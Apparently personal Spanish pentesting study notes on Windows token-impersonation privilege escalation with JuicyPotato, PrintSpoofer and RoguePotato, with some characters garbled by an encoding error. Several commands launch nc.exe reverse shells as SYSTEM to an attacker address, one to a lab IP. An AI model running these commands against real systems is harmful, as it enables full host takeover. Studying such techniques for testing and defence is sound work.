
##  Requisitos clave
- **SeImpersonatePrivilege**: permite suplantar el token de otro proceso.
- **SeAssignPrimaryTokenPrivilege**: permite asignar un token primario a un proceso.
- Estas capacidades se pueden usar para escalar de un servicio (como MSSQL o IIS) a **NT AUTHORITY\SYSTEM**.

## И M茅todos de escalada utilizados

### 1. JuicyPotato

- **Funciona en**: versiones anteriores a Windows 10 1809 / Server 2019.
- **Requiere**: SeImpersonate o SeAssignPrimaryToken habilitado.
- **T茅cnica**: Abusa de DCOM/NTLM reflection para ejecutar comandos como SYSTEM.
- **Comando t铆pico**:
```cmd	
JuicyPotato.exe -l <puerto> -p <programa> -a "<argumentos>" -t * 
```

Ejemplo:
```cmd
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c nc.exe IP PUERTO -e cmd.exe" -t *
```
NOTA: Usa un  clsid por defecto, si no funciona usar uno buscando aqu铆 hay una lista por sistema: https://ohpe.it/juicy-potato/CLSID/
Ejemplo:
```powershell
./juicy.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c nc.exe IP PUERTO -e cmd.exe" -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```

**NOTA IMPORTANTE:** En este caso con ruta relativa de nc.exe no funcion贸 y **tuve que poner la absoluta** de la ubicaci贸n d贸nde sub铆 el nc.exe:
```cmd
potato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\TEMP\nc.exe 10.10.14.112 5555 -e cmd.exe" -t *
```
### 2. PrintSpoofer (10 1809+ y Server 2019+)

- **Funciona en**: Windows 10 1809+ y Server 2019+ (donde JuicyPotato ya no sirve).
    
- **Requiere**: SeImpersonatePrivilege habilitado.
    
- **T茅cnica**: Abusa de privilegios de impresi贸n y llamadas a `CreateProcessAsUser()` para obtener SYSTEM.
    
- **Comando t铆pico**:

```cmd
PrintSpoofer.exe -c "nc.exe IP PUERTO -e cmd"
```

### 3. RoguePotato (mencionado brevemente)

- **Funciona en**: versiones modernas donde JuicyPotato no funciona.
    
- **Similar a**: JuicyPotato, pero con mejoras en la forma en que obtiene el token SYSTEM usando pipes an贸nimos y Named Pipe Impersonation.

##  Consideraciones

- Estas t茅cnicas suelen explotarse tras comprometer una aplicaci贸n que corre con permisos intermedios (como MSSQL o IIS).
    
- Siempre verificar los privilegios con `whoami /priv` antes de intentar la escalada.
    
- Elegir la herramienta correcta seg煤n la **versi贸n del sistema operativo**.